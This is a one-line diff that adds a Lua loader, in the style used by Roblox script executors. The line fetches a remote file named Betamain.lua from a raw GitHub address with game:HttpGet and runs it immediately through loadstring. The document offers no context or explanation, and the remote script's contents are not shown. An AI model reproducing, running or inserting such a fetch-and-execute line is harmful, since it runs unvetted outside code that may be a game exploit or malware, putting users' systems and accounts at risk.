@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ghost-1198/Main/main/Betamain.lua"))()
